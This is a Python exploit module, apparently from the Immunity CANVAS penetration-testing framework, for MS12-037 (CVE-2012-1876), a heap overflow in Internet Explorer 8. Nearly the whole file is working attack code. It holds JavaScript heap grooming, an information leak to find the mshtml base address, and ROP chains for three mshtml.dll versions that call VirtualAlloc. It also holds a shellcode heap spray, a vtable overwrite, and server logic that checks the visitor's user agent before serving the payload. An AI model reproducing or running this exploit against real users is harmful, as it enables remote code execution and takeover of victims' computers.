#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside

import sys
import struct
import base64
import random

import xorencoder
import canvasengine

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME                              = 'MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow'
DESCRIPTION                       = 'MS12-037 Microsoft Internet Explorer Fixed Table Col Span Heap Overflow'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Microsoft"
DOCUMENTATION['Date public']      = '06/12/2012'
DOCUMENTATION['References']       = 'http://technet.microsoft.com/en-us/security/bulletin/ms12-037'
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'Internet Explorer 6/7/8/9'
DOCUMENTATION['CVE Name']         = 'CVE-2012-1876'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-1876'
DOCUMENTATION['CVSS']             = 9.5

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP', 'Vista', '7']
PROPERTY['MSADV']                 = 'MS12-037'

DOCUMENTATION['Notes']            = """
Some information regarding this exploit:
- It uses an information leak so does not depend of third party software.
- It works with js_recon 
- It only works if the template is set as the exploit itself

Tested on:
* Windows XP Professional SP3 English with Internet Explorer 8
* Windows 7 English / Internet Explorer 8.

Tested on the following mshtml.dll versions:
* v80760016625 - unpatched install
* v80760117514 - some patchs
* v90811216447 - all patchs except for ms12-037 patch

**Important** Do not use a template other than the exploit itself!
"""

CHANGELOG                         = """
"""

# command line usage:
# python ./exploits/clientd/clientd.py -l 192.168.0.3 -d 5555 -O server_port:8083 -O allowed_attack_modules:ms12_037 -O auto_detect_exploits:0 -O always_do_recon:False -O direct_response:1 -O redirect:0
# python ./exploits/clientd/clientd.py -l 192.168.0.3 -d 5555 -O server_port:8083 -O allowed_attack_modules:ms12_037 -O auto_detect_exploits:0 -O always_do_recon:True -O direct_response:1 -O redirect:0
# ./commandlineInterface.py -v17 -p5555

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.shelllcode         = ""

    # as long as the target uses ie8
    # we may proceed with an IE9 version if I can figure 
    # out a few more primitives
    def is_vulnerable(self, info_dict):
        if "MSIE 8.0" in info_dict['user_agent']:
            return 1
        else:
            self.log("Not IE 8 - possibly vulnerable, but not to this exploit")
            self.log("User Agent: %s" % info_dict.get("user_agent"))
            return 0

    def run(self):
        self.log("Run this from clientd")
        return 0
    
    def generate_html(self):
        CTableLayout = ""
        # craft the fixed CTableLayout Object with its fixed size buffer
        for i in range(0,133):
            CTableLayout += "\n<table style=\"table-layout:fixed\" ><col id=\"%d\"" % (i)
            CTableLayout += "width=\"41\" span=\"9\" >&nbsp </col></table>"
        html = """
        <html>
        <body>
        <div id="container"></div>
        <script language='javascript'>
        
        function randomblock(blocksize){
            var theblock = "";
            for (var i = 0; i < blocksize; i++){
                theblock += Math.floor(Math.random()*90)+10;
            }
            return theblock.toString(16);
        }
        
        var padding    = randomblock(2);
        var leak_index = -1;
        while ( padding.length < 480 ) padding += padding;
        
        // heap arrangement
        var busyChunks = new Array();
        var freeChunks = new Array();
        var div_container = document.getElementById("container");
        div_container.style.cssText = "display:none";
        for (var i=0; i < 500; i+=2) {
            freeChunks[i]   = padding.substring(0, (0x100-6)/2);
            busyChunks[i]   = padding.substring(0, (0x100-6)/2);
            busyChunks[i+1] = padding.substring(0, (0x100-6)/2);
            var obj = document.createElement("button");
            div_container.appendChild(obj);
        
        }
        
        // make the chunk holes
        for (var i=200; i<500; i+=2 ) {
            freeChunks[i] = null;
            CollectGarbage();
        }
        </script>
        %s
        <script language='javascript'>
        // trigger leak
        function trigger_leak(){
            var obj_col = document.getElementById("132");
            obj_col.span = 19;
        }
        var leak_addr = -1;
        var offset = 0;
        var mshtmlbase = 0;
        function leak_vftable() {
            for ( var i = 0; i < 500; i++ ) {
                if ( busyChunks[i].length > (0x100-6)/2 ) { // overflowed
                    leak_index = i;
                    var leak = busyChunks[i].substring((0x100-6)/2+(10)/2, (0x100-6)/2+(10+4)/2);
                    leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16),16);
                    offset = leak_addr & 0xFFFF; // 80760016625 0x38d0
                    //alert("vftable: 0x" + leak_addr.toString(16));
                    break;
                }
            }
        }
        function heap_sprayer(){
            CollectGarbage();
            var heapobj = new Object();
            function rop_chain(offset){
            
                // mshtml version 80760016625 (fully tested)
                if (offset == 0x38d0){
                    mshtmlbase = leak_addr - Number(0x001738d0);
                    var rop = [
                        mshtmlbase + Number(0x00001049),    // retn
                        mshtmlbase + Number(0x00002a22),    // pop ebp; retn
                        mshtmlbase + Number(0x0001185f),    // xchg eax,esp; retn (pivot)
                        mshtmlbase + Number(0x000114fd),    // pop eax; retn
                        mshtmlbase + Number(0x00001348),    // ptr to &VirtualAlloc() [IAT]
                        mshtmlbase + Number(0x0009f581),    // mov eax,[eax]; retn
                        mshtmlbase + Number(0x0005556a),    // xchg eax,esi; and al,0; xor eax,eax;retn
                        mshtmlbase + Number(0x00002a22),    // pop ebp; retn
                        mshtmlbase + Number(0x000c1d56),    // & jmp esp
                        mshtmlbase + Number(0x00002e7a),    // pop ebx; retn
                        0x00000001,    		   	    // 0x00000001-> ebx
                        mshtmlbase + Number(0x001cdd1d),    // pop edx; retn
                        0x00001000,    		   	    // 0x00001000-> edx
                        mshtmlbase + Number(0x00002dcd),    // pop ecx; retn
                        0x00000040,    		   	    // 0x00000040-> ecx
                        mshtmlbase + Number(0x00002ece),    // pop edi; retn
                        mshtmlbase + Number(0x00001049),    // retn
                        mshtmlbase + Number(0x000114fd),    // pop eax; retn
                        0x90909090,    		   	    // nop
                        mshtmlbase + Number(0x0002505b),    // pushad; retn
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                    ];
                }

                // mshtml version 80760117514 (fully tested)
                else if (offset == 0x84f8){
                    mshtmlbase = leak_addr - Number(0x001584F8);
                    var rop = [
                        mshtmlbase + Number(0x00001041),    // retn
                        mshtmlbase + Number(0x00002c60),    // pop ebp; retn
                        mshtmlbase + Number(0x0001b43b),    // xchg eax,esp; retn (pivot)
                        mshtmlbase + Number(0x00014ef7),    // pop eax; retn
                        mshtmlbase + Number(0x0000134c),    // ptr to &VirtualAlloc() [IAT]
                        mshtmlbase + Number(0x0006f0bb),    // mov eax,[eax]; retn
                        mshtmlbase + Number(0x0028e833),    // xchg eax,esi; retn
                        mshtmlbase + Number(0x00002c60),    // pop ebp; retn
                        mshtmlbase + Number(0x0003b04f),    // & jmp esp
                        mshtmlbase + Number(0x00003059),    // pop ebx; retn
                        0x00000001,    		   	    // 0x00000001-> ebx
                        mshtmlbase + Number(0x0009ced0),    // pop edx; retn
                        0x00001000,    		   	    // 0x00001000-> edx
                        mshtmlbase + Number(0x00002fa9),    // pop ecx; retn
                        0x00000040,    		   	    // 0x00000040-> ecx
                        mshtmlbase + Number(0x000030ae),    // pop edi; retn
                        mshtmlbase + Number(0x00001041),    // retn
                        mshtmlbase + Number(0x00014ef7),    // pop eax; retn
                        0x90909090,    		   	    // nop
                        mshtmlbase + Number(0x000394a1),    // pushad; retn
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                    ];
                }            
                
                // mshtml version 90811216447 (tested, but would be nice for a retry)
                else if (offset == 0x82b8){
                    mshtmlbase = leak_addr - Number(0x001582b8);
                    var rop = [
                        mshtmlbase + Number(0x00001031),    // retn
                        mshtmlbase + Number(0x00002c78),    // pop ebp; retn
                        mshtmlbase + Number(0x0001b4e3),    // xchg eax,esp; retn (pivot)
                        mshtmlbase + Number(0x00352c8b),    // pop eax; retn
                        mshtmlbase + Number(0x00001340),    // ptr to &VirtualAlloc() [IAT]
                        mshtmlbase + Number(0x00124ade),    // mov eax,[eax]; retn
                        mshtmlbase + Number(0x000af93e),    // xchg eax,esi; and al,0; xor eax,eax;retn
                        mshtmlbase + Number(0x00455a9c),    // pop ebp; retn
                        mshtmlbase + Number(0x00128b8d),    // & jmp esp
                        mshtmlbase + Number(0x00061436),    // pop ebx; retn
                        0x00000001,    		   	    // 0x00000001-> ebx
                        mshtmlbase + Number(0x0052d8a3),    // pop edx; retn
                        0x00001000,    		   	    // 0x00001000-> edx
                        mshtmlbase + Number(0x00003670),    // pop ecx; retn
                        0x00000040,    		   	    // 0x00000040-> ecx
                        mshtmlbase + Number(0x001d263d),    // pop edi; retn
                        mshtmlbase + Number(0x000032ac),    // retn
                        mshtmlbase + Number(0x00352c9f),    // pop eax; retn
                        0x90909090,    		   	    // nop
                        mshtmlbase + Number(0x0052e805),    // pushad; retn
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                        0x90909090,
                    ];
                }
                return rop;
            }
        
            function d2u(dword){
                var uni = String.fromCharCode(dword & 0xFFFF);
                uni += String.fromCharCode(dword>>16);
                return uni;
            }
            function tab2uni(heapobj, tab){
                var uni = ""
                for(var i=0;i<tab.length;i++){
                    uni += heapobj.d2u(tab[i]);
                }
                return uni;
            }
            heapobj.tab2uni = tab2uni;
            heapobj.d2u = d2u;
            heapobj.rop_chain = rop_chain;
            var code = unescape("%s");
            var rop_chain = heapobj.tab2uni(heapobj, heapobj.rop_chain(offset)) ;
            var shellcode = rop_chain + code
            while (shellcode.length < 100000)
                shellcode = shellcode + shellcode;
            var onemeg = shellcode.substr(0, 64*1024/2);
            for (i=0; i<14; i++) {
                onemeg += shellcode.substr(0, 64*1024/2);
            }
            onemeg += shellcode.substr(0, (64*1024/2)-(38/2));
            var spray = new Array();
            for (i=0; i<400; i++) {
                spray[i] = onemeg.substr(0, onemeg.length);
            }
        }
        function smash_vtable(){
            var obj_col_0 = document.getElementById("132");
            obj_col_0.width = "1178993";                    // set the vftable to 0x07070024
            obj_col_0.span = "44";                          // the amount to overwrite
        }
        
        // timing is everything
        //setTimeout("trigger_leak();", 0);
        //setTimeout("leak_vftable();", 50);	
        //setTimeout("heap_sprayer();", 100);
        //setTimeout("smash_vtable();", 150);
        
        setTimeout("trigger_leak();", 100);
        setTimeout("leak_vftable();", 1000);	
        setTimeout("heap_sprayer();", 2000);
        setTimeout("smash_vtable();", 3000);
        
        </script>
        </body>
        </html>
        """ % (CTableLayout, urluencode(self.shellcode))
        html = html.replace("        ","")
        return html
 
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        self.log("Request: " + clientheader.URL)
        if self.plugin_info:
            info_dict=self.plugin_info # js_recon
            self.log("We got a plugin info for this target - thanks clientd!")
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring = self.generate_html()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed. Not vulnerable?')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h,b

        else:
            self.log('redirecting to self test!')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
